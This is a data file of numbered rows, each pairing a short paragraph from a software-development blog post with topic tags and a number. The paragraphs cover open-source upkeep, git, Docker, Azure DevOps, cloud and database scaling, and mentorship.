3238,"Whatever tests dont catch, types will. These days if you arent typing your JS, you are driving without a seatbelt on. Plus, with more and more people using TS or Flow, they are coming to expect that types are in place. Write your libs with types, export and provide the types, and thank me later. Or let somebody else type it later, third party style, out of date and probably wrong.",['Open Source'],9
3239,"Repo Prerequisites README.md CONTRIBUTING.md LICENSE.txt A valid, filled out package.json So README, duh. You should ALWAYS include a LICENSE.txt, or some people wont be able to use your repo. Dont be cute with some self written bullshit license.",['Open Source'],18
3240,"Tired of writing CSS with a keyboard? Guess what, now you can do it with an XBox controller! Stack Traces got you in the dumps? HOW ABOUT IF THEY WERE EXPLORABLE IN FUCKIN VR! Make it immediately clear what this thing does and why they should use it, with a link. The process should go: Browsing Twitter Oh look at this tweet Oh shit! Clicks link Lands on repo, oh cool it looks legit af Goes to Getting Started Copy/Paste into terminal, Rock and Roll[clicks star button]Your mileage may vary depending upon your follower count and their predisposition to whatever tech your selling, but this generally works. Outside of Twitter, great outlets to drop this on are HN (sorry) and Reddit.",['Open Source'],19
3241,"I have this happen all the time. Go back to the drawing board. Sometimes some stuff doesnt catch fire. It doesnt mean you suck or your idea sucked, it just wasnt time. The important thing is that you built something. And the next time you build something, youll be even better prepared for success. Pat yourself on the back, you fuckin shipped!2.",['Open Source'],4
3242,"First, if anyone expresses interest in working on your lib, make them a maintainer. Hold on: IF ANYONE EXPRESSES INTEREST IN WORKING ON YOUR LIB, MAKE THEM A MAINTAINERHeres why: Time will pass, new technologies will emerge, problems change. Your repo will still be there. If you dont delegate, you WILL have a bad time. You will burn out on maintenance, youll resent the project and it will turn into a shit show.",['Open Source'],18
3243,"Or dont, and everyone will lose their god damn minds. As your library evolves, its important for invested parties to know whats going on.",['Open Source'],17
3244,"With all that said, I have one last recommendation. Dont do this unless you actually want to. Dont feel like you have to. You can get a job without it. You can be a good developer without it. Ive benefitted from it greatly, and enjoyed doing it, but I will never get the time back that I spent fucking around on libraries for free, that I could have spent with my family or pursuing hobbies or doing literally anything that would provide passive income. Do it because you want to. If you arent passionate about what youre building, it probably wont succeed.",['Open Source'],2
3245,"As the token operator amongst developers with a little bit of networking experience, I get a lot of requests from developers that sound a bit like this: Networking is an intriguing field with fantastic acronyms that rival our modern texting lexicon and works like magic. However, for the software engineer, its not always clear why the network matters and how it affects an application. We take it for granted that when our application sends a GET request to another application, we just receive a response. But under the hood, why does it matter? What simple terms should we know to communicate about our application networking? This is not an overview of the OSI reference model or networking layers. It is not intended to train anyone for a network certification, help configure a switch, or outline every detail about software-defined or container networking. It will not help answer the omnipresent interview question, What happens when you type a URL into the browser and press enter?","['Cloud Computing', 'Network Security', 'Networking', 'Software Development', 'Containers']",10
3246,"If you take away nothing else from this post, take away git status. This is easily the command I use the most with regards to git. If you ever, ever want to see whats going on with your git repo, git status will tell you. Youll see me continue to use git status in the rest of this post!!! So youve officially made a git repo. Time to start using git to track your changes. Lets break down what that process looks like.","['Git', 'Terminal', 'Gitflow']",18
3247,"Looks like there are some untracked files and a message from git prompting us to do something. That message is actually in two places, the other being at the bottom. Git is saying I see youve made some changes but you have to add them for me to pick it up. The file where those changes are appears in red. This is a another hint that something needs to be done by the user! The files that appear in red after git status represent unstaged changes. These unstaged changes are changes that are not ready to be committed by git at least not yet. You have to tell git to add those changesor stage them.","['Git', 'Terminal', 'Gitflow']",18
3248,"Before I go any further, what exactly is a commit? Think of a commit like an entry in a journal. Each journal entry describes what you did that day or week just like a commit does. Inside your whole journal you would have multiple entries that compromise the entirety of the journal. If you want to go back and check out what you did on a certain day, all you have to do is flip to the journal entry with the date youre looking for. Maybe it even has a unique title if you were nice enough to give it one.","['Git', 'Terminal', 'Gitflow']",18
3249,"Take a second to think about this what might be problematic here? Whats the actual homebase for the code? Can you push code that trumps another team members code? Is the version of the project on your computer the real version, or is it the version online? This is where the fun begins, and by that, I mean, where git can start to get complicated. For the purposes of this post Im going to graze over the details here. Partially because different companies operate under different pretenses and also because a budding new developer should focus on the basics first.","['Git', 'Terminal', 'Gitflow']",18
3250,"Ill leave you with some food for thought though. It is possible that you might want to push your code to a location thats not origin master. Perhaps you made your own little happy git landaka a branch, where your changes live temporarily. Your branch would be part of many branches on a tree where the tree trunk is the master branch. Actually its not There are git pros out there who still learn new tools for git frequently, so dont fret.","['Git', 'Terminal', 'Gitflow']",18
3251,"It can be good to work in different industriestheres a lot of learning and innovation at the intersection of industries Create a personal learning planwhat do you want to learn, what do you want to gain from your next role, where are areas you need more experience? What are the expectations of a Product vs. Platform PM, and B2B vs. B2C PM? As a Product PM, you are required to have an in-depth knowledge of the customer, find the right product/market fit, and grow the business. Depending on the stage of the company, you could be responsible for growing a million vs. a billion users. The Product PM role comes with the luxury of deep focus.","['Product Management', 'Women In Product', 'Product', 'Mentorship']",0
3252,"Version compatibility Multi-stage builds support was added to Docker in version v17.05. All the patterns here work with any version after that, but some of them run much more efficiently with the builders that use the Build Kit backend. For example, Build Kit efficiently skips unused stages and builds stages concurrently when possible. Ive marked these cases under the individual examples. Build Kit is currently being added to Moby as an experimental builder backend and is scheduled to be available in Docker CE v18.06. It can also be used standalone or as part of the img project.","['Docker', 'Dockerfiles']",7
3253,"Multi-stage builds added a couple of new syntax concepts. First of all, you can name a stage that starts with a FROM command with AS stagename and use --from=stagename option in a COPY command to copy files from that stage. In fact, FROM command and --from flag have much more in common and it is not accidental that they are named the same. They both take the same argument, resolve it and then either start a new stage from that point or use it as a source for file copy. That means that same way as you can use --from=stagename you can also use FROM stagename to use a previous stage as a source image for your current stage. This is useful when multiple commands in the Dockerfile share the same common parts. It makes the shared code smaller and easier to maintain while keeping the child stages separate so that when one is rebuilt it doesnt invalidate the build cache for the others. Each stage can also be built individually using the--target flag while invoking docker build.","['Docker', 'Dockerfiles']",15
3254,"Lets finish up with an example of combining the previous patterns to show how to create a Dockerfile that creates a minimal production image and then can use the contents of it for running tests or for creating a development image. Start with a basic example Dockerfile: This is quite a common when creating a minimal production image. But what if you wanted to also get an alternative developer image or run tests with these binaries in the final stage? An obvious way would be just to copy the same binaries to the test and developer stages as well. A problem with that is that there isnt a guarantee that you will test all the production binaries in the same combination. Something may change in the final stage and you may forget to make identical changes to the other stages or make a mistake to the path where the binaries are copied. After all, we want to test the final image not an individual binary.","['Docker', 'Dockerfiles']",18
3255,"Raspberry Pi: The Raspberry Pi is a small, affordable, and amazingly capable, credit card size computer. It is developed by the Raspberry Pi Foundation, and it might be the most versatile tech ever created. At the time of these writing you can buy it for less than US$40.-Raspberry Pi 7"" Touchscreen Display: Raspberry Pi touchscreens can be easily connected using a DSI ribbon cable and be powered from the GPIO. The full color display outputs up to 800 x 480 and features a capacitive touch sensing capable of detecting 10 fingers. It costs about US$70.-When using the touchscreen display, a suitable case to house both the Raspberry Pi and the display makes it safer to handle. There are a couple of inexpensive options out there.","['Raspberry Pi', 'Circuit', 'Unify', 'Circuit Sdk', 'Atos']",5
3256,"On the Git Hub circuit Kiosk repository you will find examples on how to use some of the capabilities of the Circuit platform using the Javascript SDK. You will see how to instantiate the Circuit client, set the log levels, add event handlers, log your application, search for users, and process those search results. You will also learn how to find and create Circuit conversations, send text items, and process received ones. The application also makes use of Circuit forms that are sent as text items. Forms submissions are received as text items, and you will see how to process them. In the code you will also find how to setup a video call, process call events and handle the call media by getting the remote streams from the instantiated Circuit client.","['Raspberry Pi', 'Circuit', 'Unify', 'Circuit Sdk', 'Atos']",7
3257,"However, the DALI spec, like DALI itself, is a unique creature. In The Real World one of the multitude of different types of specs might be written for a 4-month project. In DALI, a spec lasts 10 weeks. The Real World can have communication struggles between different departments and a spec can be a great way to notify the necessary stakeholders that a project is underway. At DALI, its pretty difficult to not know which project youre on, but its easy to miss a design element because the designers were working at 10PM on a Sunday night. Since DALI has its own set of challenges, it only makes sense that DALI gets its own article for writing more useful specs.","['Agile', 'Project Management']",12
3258,"I guarantee you that I cant write the most high-fluting, eloquent spec in the world. But even if I could, it would serve the same function as any other spec: to help the team get things done. If my super duper spec doesnt achieve that purpose, its probably not worth the time. In fact, theres a good chance that itll get thrown into the abyss of Google Drive, never to be opened again. If none of these ideas help your team, theyre also not worth the time.","['Agile', 'Project Management']",12
3259,"Every website has a profile page, right? Unfortunately, I just wrote a requirement thats limiting our success. First, it assumes that all profile information should be in a page. What if the profile is better represented in a tab? In general, DALI teams write the feature spec around week 3. The paper mocks might not even be done by then, let alone a decision that a profile user requirement should be a page.","['Agile', 'Project Management']",6
3260,"In doing this, were attempting to better understand how the users defined in the user personas would interact with our webpage. When does the user access profile information? Sure, we could answer those questions with normal requirementsbut this way, were not letting the user out of our sights for a single second. If you want a better explanation of user stories, feel free to check out this article written by a chaos muppet.","['Agile', 'Project Management']",6
3261,"The Happy Path is the story about an imaginary user and their absolutely perfect interaction with your project. Designers, and in my opinion the rest of the team as well, should be writing this during Week 3 (its under Connecting Features in the DALI Build page). Not only does this force the team to compare the users interactions with your proposed features and fix discrepancies, but it also makes it harder to forget the perfect user story during Week 8.5 when finals are looming, youre in a rush to finish a component before your partner meeting, and youre running on 2 hours of sleep in 5 days. The Happy Path will always be there for you in such troubling times. :)Our specs here are normally pretty short, which makes this less of an issue. However, If you put mockups, the happy path, or anything involving your requirements in different parts of the spec, you can just add the number pertaining to that requirement at the end of the sentence. If youre using MS Word, you can use its reference features. If youre using GDrive, you could highlight the number and make it a different color. Theres a few reasons why you might do this:a. If your team reaches crunch time and decides it needs to cut some features, you can search for all instances of that requirement number and cross out those sentences.b. Its easier to search for information related to a particular requirement.c. If your team delegates requirements to different members, you can highlight each occurrence of a requirement number and highlight accordingly.","['Agile', 'Project Management']",0
3262,"There are some problems that can be fixed, and some that cant. For example, getting the look and feel of Santa Sweaties is something my team can control. The spike in site traffic and potential crashes during holiday season is a potential problem that the team might not be able to address in 10 weeks and with limited experience with handling web traffic. Thats a good thing to list in a feature spec and potentially discuss down the line. Similarly, during the term there are going to be bugs and other issues that just arent worth fixing. Were there not enough female children between the ages of 2 and 4 in Hanover to interview during user research? Are the margins 3 pixels too wide when viewed on an i Phone 6?","['Agile', 'Project Management']",1
3263,"Im not entirely sure whether such a ham-fisted approach would do much good here at DALI. But he was definitely on to somethinghow things are worded will say a lot to future teams who pick up your spec after your term ends. Your partner might also read the feature spec and interpret your requirements differently. Examples from the users point of view can never hurt when illustrating something. In fact, why not try using more pictures? Fancy art is open to interpretation; detailed user flows and diagrams function contrarily.","['Agile', 'Project Management']",12
3264,"Sometimes, its easier to define some things your team wont do before determining what it will do. A non-requirement list could help to take the ideas that pop up and get shot down over and over again in team discussion and lay them to rest. You could also use a section like this for frequently asked questions. When Santa Sweaties presents its project and someone inevitably asks if the teams considered tank tops for all the people in warm climates, the team can definitively say it has, and point to the list. Makes more a more productive presentation, no? Do you have any other ideas for how we can make feature specs more useful? Feel free to talk to me or leave a comment!","['Agile', 'Project Management']",0
3265,"This is so vital that it could quite possibly change the direction of the project itself (which is why its #1 on my list!). I highly recommend building a specification sheet to better identify what the product will look like, what it will do, and how it will do it. More on this under communication and expectations! We built a new wooden bridge that looks way prettier than the old one. Oh, no, it cant support cars. Pretty much anything heavier than a bird will break it.","['Agile', 'Software Development', 'Project Management', 'Outsourcing', 'Mobile App Development']",12
3266,"When a young developer is hired for an internship at Softnology, the developer receives a warm welcome at the door when they arrive at the office. Once inside, the intern scans the room and notices that only one other intern has arrived. After the initial pleasantries are out of the way, the intern comes to find out that Softnology only hired two interns, which makes sense, considering that Softnologys entire company is comprised of 6 employees. The company is co-owned: one owner works as a full-stack developer, the other works as a designer, and each owner beckons to an intern to join them. Our intern eases into the developer-owners office, prepares to sit down across the desk, but stops halfway into the chair. The owner is beckoning the intern to come around the desk and sit with him.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",0
3267,"At the end of the Softnology internship, the company took the interns out to a last-day lunch. As they ate, the employees reminisced over the work that had been done and the progress that had been made over the past three months. The boss laughed again about how our intern had saved him on the interns very first day by catching a typo in the code, and the intern was quick to remind his boss about how many typos the boss would catch of his in a single day. As lunch progressed, the owners began to ask for the interns opinions on the internship program as a whole. Did the interns feel like they got anything out of the program? Did they feel like the work they did was fair, and not too easy or too hard? The conversation followed this pattern until the end of the meal, and then the interns went their separate ways, leaving Softnology with new insights, goals, and dreams for the next round of the internship program.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",0
3268,"Mentorship is something that is often forgotten about in this day and age, especially by companies who value the profit and the output more than their employees and their future. When a young employee, especially a young developer, can have the opportunity to be mentored, entirely new worlds can be opened up that they had never even known about before. I am a product of that idea; when I took an internship with a company like Softnology, I had just begun programming because my attempt at becoming an engineer just hadnt worked out. I knew I liked computers, but I didnt know anything more than that. I lucked out when I landed this internship, and by the time I had finished the summer, I was a changed developer. Instead of being unconfident in my own work, to the point where I was literally terrified to push my code live, I was confident in my abilities. Instead of having no idea where the boundaries of my knowledge were, I left with a deeper understanding of what I knew, but more importantly, of what I didnt know.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",2
3269,"I can say without a shadow of a doubt that I am the software engineer that I am today because I was mentored. I am in a field that I love more than anything because I was mentored. My standards for employment and work, in general, are now higher than ever because I was mentored. And, most importantly, I am better personally, as an employee, and as a mentor because I was mentored. And now, being on the other side of the coin working for a company who uses this mentorship model with our own interns, I can guarantee that having a mentorship culture in the office brings countless benefits to the company as a whole. Mentees bring a feeling of new life to the company, bringing with them new ideas and experiences and points of view that can only be absorbed by spending time getting to know them and work with them, just like in the mentorship model.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",2
3270,"Employees, interns, young developers, dont settle for a company that doesnt give you the care and attention you deserve. You might learn a lot about programming from having an individual project and having to learn through your problems yourself, but you can learn a lot more from having a mentor. Having a mentor teaches you about your field, for sure, but it also gives you insight into other parts of your life that you probably dont even know need to be mentored. Even if interning for that company will look amazing on your resum or will earn you a lot of money, I say that interning for a company where you get to work on projects that matter, working right with a seasoned employee will give you exponentially more benefits in the long run. And if youre lucky enough to find a company that will look amazing on your resum, earn you a lot of money, AND will mentor you through the whole internship, latch on and dont let go! If youre interested in becoming a mentor, or are searching for a mentor to call your own, there are a few options that you can look into! There are lots of organizations geared specifically at matching up mentees with mentors across a wide variety of fields. Generally, they have fairly simple sign-up processes, so long as you pass their background checks. One example of an organization like this can be found here: __url__ box.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",2
3271,"In the coding world, the idea of meetups is huge. If youre not familiar with the lingo or are outside the world of tech, a meetup is basically a large meeting of like-minded people. They can consist of anything from just meeting up to network and mingle, to having a talk about a specific topic, to getting together to work on similar projects. They can also be incredible places to find people willing to mentor you or to find people to mentor. If youre into programming, Free Code Camp has tons of meetups (they call them study groups) around the world. Follow this link to see if you have one near you: https://study-group-directory.freecodecamp.org.","['Internships', 'Mentorship', 'Programming', 'Hiring', 'Software Development']",2
3272,"What is the anticipated size of data (including VM image sizes) that you intend to move from your data center? Do you already have a dedicated pipe (direct connect, express route, interconnect) to the public cloud? Does that data to be uploaded from your data center need to be encrypted? Public cloud vendors push the idea of elasticity and automatic scaling rather hard. Elasticity, auto scaling, guaranteed uptimes can lull you into a false sense of security. Your app can conjure up additional memory and compute power (in the form of additional instances) whenever the current instances run short. However, you really need to ask yourself Why is the current instance running out of memory / CPU? A single poorly written query against your production database can bring your online application to a halt. Instead of running those monstrous queries off your production node, have you considered using a read-replica node? With the cloud, such options are not just possible, but a matter of a simple point and click.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'Azure', 'Data']",11
3273,"It also means that Id recommend that engineers look outside of coding. Im basically the worst artist you can think of, but I constantly try to learn more about graphic design, about UI and UX, so I can make better, more beautiful apps and solutions. See one of my old, but most popular, posts here on making apps not look awful! The beauty of technology (and the world) is that you never know when or what some genius is going to create something new and change the world. When I started my career as an engineer, smartphones didnt exist. Now so much work that I do relates to them. But like I said earlier, I can see that changing soon, too.","['Technology', 'Tech', 'Life Lessons', 'Artificial Intelligence', 'Augmented Reality']",2
3274,"True AI could bring enormous benefits. An entity (or entities) infinitely more intelligent than ourselves could solve problems we cantscientific, medical, sickness, even perhaps death. Would it choose to do so, though? Have we made life wonderful for chimpanzees? Ive used this in my recent talks as I think it sums it all up. Ken Robinson said in his famous Ted talk Children starting school this year will be retiring in 2065. Im updating that for 2018: Can you imagine what the world will be like in 2081? If youve any thoughts or comments, let me know below, and you can get me on Twitter or Linked In or Medium.","['Technology', 'Tech', 'Life Lessons', 'Artificial Intelligence', 'Augmented Reality']",5
3275,"Ill explain how to do it and how to avoid a pit hole.12 Factor app recommend to store config to Environment Variables. A lot of app might follow this strategy. Azure Dev Ops doesnt allow you to dynamically configure and set Environment Variables. A lot of blogs mention how to do it. Currently when I tested it, we cant set Environment Variables during the pipeline. For the static Environment Variables per environment, we can do it. However, if you want to have dynamically configured Environment Variables, it wont work. Please see how to set Environment Variables as Pipeline Variables.","['DevOps', 'Azure Devops', 'Powershell']",7
3276,"When I test it (05/03/2019), We can set Environment Variables for User scope. However, If you want to get Process level Environment Variables, you cant get it. On your PC, once you set the User level Environment Variables, you can refer it as Process level. However, it is not for Azure Dev Ops. I assume that before execute a task, they might remove all Process revel Environment Variables and set these from Pipeline Variables. Im not sure however, according to my observation, it looks like that.","['DevOps', 'Azure Devops', 'Powershell']",7
3277,"As you can see, we have three agents. You can get the Value of the Job Name with AGENT_JOBNAME It is predefined variables. Pipeline Variables can available as Environment Variables. However, it have some rule to convert to them. Make is upper case and . Now you can get the Job name. Job1 As you can see, Id like to get the number, it is different for each Job.","['DevOps', 'Azure Devops', 'Powershell']",15
3278,"What I want to share with you guy is, forget about the dynamic environment variables strategy. I stick to the strategy, and I lost almost one day. After some improvement of this pipeline, we encounter the issue, for failing tests. It works locally, however, we cant figure out at that time. In this case we simply cross out the script. For the test part we do something like this.","['DevOps', 'Azure Devops', 'Powershell']",13
3279,"It was a monolithic application, with 7 million lines of code, which is a lot of code for something thats only been around for eight years. There was 3 million lines of backend code, 2-point-something million lines of java script. It required eight hours of downtime on a Saturday, twice a year, to deploy it. The entire process around it was very waterfall-y. There wasnt really a notion of product development or product owners. There were one or two product people and an army of business analysts writing a lot of documentation. In terms of the infrastructure, we were deployed to Rackspace, on a single database server with multiple database instances. Wed gone about as far as you could go with vertical scaling.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",10
3280,"What attracted you to the job? Just the idea that, Holy crap, these guys have a lot of challengessome that they dont even know they have. You just need to convince people that it can be done, and then you need to convince people that they need to invest time to do it.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",2
3281,"It can be difficult to sell the business side on the changes necessary to implement Dev Ops. Believe it or not, it wasnt a hard sell. My boss is somewhat technical, so he understands theres a reinvestment you have to make in software development and technology in general. I think the conversation started with, We need to go faster. We need to scale this team out. He didnt believe it would scale in its current form, and I confirmed that it wouldnt scale the way they were planning to do it because there were choke points. So the sale became, I can get us to go faster and mitigate risk by just releasing more frequently. From a sales perspective, when a client says, Id like to see this feature, you can tell them, Its a five-month window. But if for some reason you miss that five-month window, its really hard to go back and say, You need to wait another five months.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",1
3282,"What about the conversations with your team? The application was largely built by a third-party contractor. My staff right now, of 85 people, 70 of them are contractors. Almost all of them are based in Russia, spread across two locations. Youve got cultural differences, so its hard to explain. Not only was everything built on a Microsoft stack, but it was an old school Microsoft stack. So if you tell them, We need to move to Git because were doing feature branching, they dont know how that works. You describe it by asking, What allows you to do a hot fix very quickly? You get them thinking, Well, weve isolated the change, we know exactly whats happened, we can make decisions about the level of testing, because the test surface is much smaller. So you convince them that everything needs to go hot fix.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",0
3283,"When I started, the application was a big ball of mud, built by a big ball of developers. So our experiment was to try a reverse Conway. Even though we had a really large, one-big-deployment solution, we split the teams into ten different teams and told them they owned certain areas and told them to start carving their code out and making sure they have independent, deployable pipelines. That took a year, because you still have a product to put out. You cant just stop conducting business during development. You have to continue to develop and carve out time to make these changesbasically pay down your technical debt. So we spent most of 2017 splitting things apart so that people were less scared about deploying their pieces of code. And now the application is about 25 different deployable applications, all talking together.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",10
3284,"Its interesting that you got instant buy-in from the business side but ran into resistance from your developers; usually its the other way around. How did you deal with that? Ive actually done this a couple times, so every time someone gave me a what if, I had a really quick response for it. I can respond to the technical questions really quickly. The business questions are always a balancing act. I was fortunate that the business was ready for change and understood the value proposition more quickly. I understand how fortunate I am to have that. Its a great reason to be here.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",0
3285,"Deployment pipelines are still about an hour. Actually, its an hour to four hours, by the time you commit code and all of the tests run and an environment is created. We need to be much faster than that. Part of that is our allocation of environments, part of that is that the gauntlet it runs through isnt really optimized. So theres some pipeline optimization and some process changes that need to happen. The mandate was that there will be no more manual testers in this organization by the end of the year. Im not going to have an army of people to do repetitive tests. I need people to write robots.","['Software Development', 'DevOps', 'Deployment', 'Continuous Delivery']",10
3286,"Our first service is the minion, where we specify a Docker image (you can define a build-path for a Dockerfile locally for compose to use, but I use the standard pull from Docker Hub in my example here), and then the other service to link it to (master) along with other services that should be provisioned before it (depends_on, in this case, master, or else the keys will not be getting sent anywhere). The master service standsalone and does not require a link to resolve the minion nodes and relies on the container network overlay (saltstack_default) to issue the Salt calls from the master, and the minion nodes resolve the master using the link (in the absence of us hardcoding addresses, etc. )From here, you can run the compose CLI to provision your test bed: The service as it exists now for minions only creates onefor the purposes of demonstrating the parallelism options in Salt Stack, you can also use the Compose file to adjust this by using the scale key under the minion service definition:and when you run the compose again (or update the existing deployment), you can see, when you exec into the master and run a Salt CLI command, that you return the full complement of minions being managed:and then run things like testing your formulas and states, etc. as you might on a normal full VM or other machine. The obvious limitation is basically anything that requires configuring anything with changes to the kernel module configuration, etc. You would not, for example, use this to manage salt-minion in production containers running other processes, but you could use this as part of a test pipeline for saltstack states, or simply to understand how Docker containers interact over a container network, and handles various resources from a host resource pool. Additionally, most Compose API usage will work atop the Swarm APIs, and in effect, much of the logic will apply to other distributed orchestration like Kubernetes: Quick Note on Creating Services and Linking Pods in Kubernetes The use-case in my example: __url__ approach).","['Docker', 'Saltstack', 'Configuration Management', 'Systems Administration']",7
3287,"In the example above, the function accepts a number and returns that number incremented by 1. The logic itself is pretty straight forward - pass in 1 and it returns 2. Take a closer look however, and there is an extra edge case. What happens when the parameter is nil? These questions can be overlooked if the main goal is just to get the code to work. Sometimes developers can add unintentional edge cases, therefore adding unit tests can help catch them.","['Software Development', 'Programming', 'Unit Testing', 'iOS', 'Swift']",3
3288,"In other cases, the APIs you selected may already be able to handle the load. Does that mean the communication was unimportant? No, because it opens up the communication channel and lets the API teams plan for additional monitoring around release dates. *Beyond forewarning, early communication allows you to begin asking questions early. This opens the line of communication for questions that arise later during integration. This allows the API teams to learn and influence how you are planning on using their APIs. It also allows the front-end development team to determine the idiosyncrasies of the APIs they are planning to use. This is a communication pattern that should continue throughout the development process and even after release; helping to avoid unwanted surprises for both teams and helping to get questions and concerns resolved quickly. *Communication will also help to debug any unexpected behavior that the client team is facing. However, for this communication to be most effective, both teams need to be honest about any issues or limitations in their code and open to potential solutions.","['API', 'Mobile App Development', 'Api Integration', 'Capital One']",1
3289,"The more information in this documentation the better, but at a minimum it should contain all of the request fields, specifying their data types and acceptable values, in order to properly call the API, the basic structure of the response, and a point of contact for questions. Better documentation will also include information about error scenarios, sample requests, and sample responses, including those for error scenarios. Again, the more information here the better. If the API team feels that there is any other relevant information to the API it should be included. *It is just as important though for the client-side team to have documentation around what they expect from an API. This documentation should be consistent and applied to all APIs that they integrate with. (Obviously, exceptions will arise, but these should be rare.) This documentation will allow the API teams to quickly gain an understanding of what you are asking of them and their API.","['API', 'Mobile App Development', 'Api Integration', 'Capital One']",15
3290,"In the operations above, Ive stated that the controller is issuing the commands and driving the signals to the NAND device. The particular part of the controller that does this is called a channel. Multiple NAND devices can be connected to a channel, although they share the same signals. This is where the chip enable (CE) line comes in to play. The channel can multiplex between the CE lines to drive a particular NAND chip. Any chip not getting the expected CE signal (either active low or high) will ignore the signals on the other lines. This is also how chip interleaving is performed. Well discuss interleaving and concurrency in later part of the series.","['Nand Flash', 'Solid State Drives Ssd', 'Firmware', 'Software Development', 'Technology']",3
3291,"Someone might ask, where do we get all that information about the domain, the architecture, patterns and guidelines? There are few methods you could follow and I recommend diversification of these methods in order for you to get all the information you need to learn about a certain project:1. Find all possible documentation, even if it is outdated, and build a knowledgebase around common terms, abbreviations and concepts your team is using to refer to certain features in the system.2. Once you build your knowledgebase, you can now communicate with the program managers and engage them into domain discussion about what the software is trying to do from a business perspective.3. Communicate with the architects and team leads about what high level architecture the software is following. Then go read or watch as many tutorials as you can about that architecture and its best practices, and then engage in discussion about what you think is violating the standard architecture to get a better understanding of how the system is designed.4. Be sure to communicate with the developers and engineers on the team to understand what patterns are followed and what coding guidelines are enforced to maintain the code, then again, go back and study about these patterns and run comparisons to find where it best fits to follow the pattern and enforce the guidelines.5. Start doing some clean-up work and fix potential defects to get a deeper understanding on the code-level to grasp deeply how the team communicates their thoughts through code reviews and fully understand what they recommend for a better clean-up work procedure.","['Software Development', 'Learning', 'Coding', 'Software Engineering', 'Software Engineer']",19
3292,"Most people are familiar with the term hybrid; although it is usually in relation to cars. Fortunately for the sake of my point, it will do just fine. Now, by definition, a hybrid is the result of something new being made by combining two different elements, and in the case of hybrid cars, it is an electric and gasoline-powered engine. This provides the user with the fuel efficiency of an electric motor with the power and convenience of a gasoline one. However, it isnt only cars that are enjoying the benefits of combining two different elements to create something new and better, for the world of IT has constantly been melding together concepts, principles, and methodologies in order to have the best of both worlds. Today, we are going to dive into one of those combinations known aptly as the Hybrid Cloud.","['Cloud Computing', 'Hybrid Cloud', 'Cloud Strategy', 'Cloud As A Service', 'Cloud Architecture']",5
3293,"Companies like Google write revolutionary software which has never been written before, and which doesnt work until complex subcomponents are written. Bigtable and Borg immediately come to mind. Bigtable is a widely copied design for a distributed database, and Borg was one of the first extremely large scale cluster/cloud managers. This type of innovation takes significant up-front design time, and working on components over longer than one week iterations. Because the projects have such simple external interfaces, and so much internal complexity, much of the work is not even visible to customers, so there is no way to write customer visible stories about it. This type of software takes 820 months to deliver the first working version to the customer.","['Agile', 'Software Development', 'Google', 'Tech', 'Startup']",16
3294,"And its precisely that property of being almost sorted that makes them so useful. In fact, sorted arrays are a special kind of min-heap, but we dont need our data structure to be that strict. At any point, we just need to have the next smallest element on hand. And heaps make that really simple: Heres my solution in 7 steps: The code might seem a bit complex at first, but most of the methods build on one another pretty well. If you have a good understanding of heaps this problem should come naturally. And like I said earlier, heaps are incredibly useful data structures to understand.","['Programming', 'Algorithms', 'Interview', 'Data Science', 'Software Development']",9
3295,"When the 8GB RAM, I3 processor and HDD disk are not enough anymore, then you spin up another VM. The new one have 512 GB RAM, Xeon processor and the latest SSD disk. It is the easiest and fastest way to scale a web app. It requires only moving the web app content to the bigger new VM, without changing the source code. Azure provides VMs up to 448GB dedicated RAM. (more)If even with this monster VM, the app cannot handle all the load, then Scale Up reaches its limits because VMs at the end cannot have unlimited RAM and CPU. So, what is if we can share the load on multiple VM instances?","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",11
3296,"CDN is used to reduce the latency for getting static content from the server to the users location. This latency is mainly caused by 2 reasons. The first reason is the physical distance between the user and the server. CDNs are located in multiple locations called Point-of-Presence (POP) around the world. So that it is possible to get one that is closer to the user location than your servers are. The second is accessing the file on the disk, so CDN might use a combination of HDD, SSD or even RAM to cache these data, depending on the frequency of data access frequency. A time-to-live (TTL) can be applied to the cache to say it should expire at a certain time.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",11
3297,"These microservices communicate with lightweight mechanisms, often an HTTP resource API. Because they are small parts, they dont need the entire VM instance to run. Instead, they can run on a Container. A container is another form of OS virtualisation. Unlike the VM, it just has the minimum resources needed to run the app. This results in a light weight image. Hence, it is more scalable than VMs.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",10
3298,"The browser can intelligently cache the HTTP requests and their responses if the web app wants to. In addition to that it can provide a TTL (Time-To-Live) for each stored data. This way the web app will reach the server only for the first time, then the next time it will get the response from the cache. This not only reduces the load on the server, but also makes the client app more responsive. This approach is relatively easy to be implemented as it only requires adding HTTP Headers to the requests. The browser will interpret those and take the responsibility to either return data from its own cache or routing the request to the server.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",11
3299,"Until now, we have explained the options for scaling a web app. But, almost all apps connect to a database server. When the app gets more load, it typically affects the database. Like the web app, the database cannot receive infinite requests/queries per second. Not only that, the SQL database instance have a maximum amount of data to save. So how to scale a database? Most of the principles we used for scaling a web app are applied for scaling a database. Those are all about vertical and horizontal scaling, caching and replicates. Well explain them one by one and start with the easiest option to the more complex.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",8
3300,"Caching queries is limited by the size of the available memory. And when lots of queries cannot benefit from the cache and needs to query the big tables, then we need an option to retrieve data as fast as possible. Well, indexes are made for that! Relying on the ID to retrieve data from the tables requires looping through almost all the rows. That is because the ID is a non-ordered primary key. The customer with ID equal to 5 could be on the row number 7. With using index, itll be on the 5th row. As a result, theres no need to loop the entire table if we know where exactly we can find it.","['Scalability', 'Database', 'Cloud', 'Kubernetes', 'Docker']",8
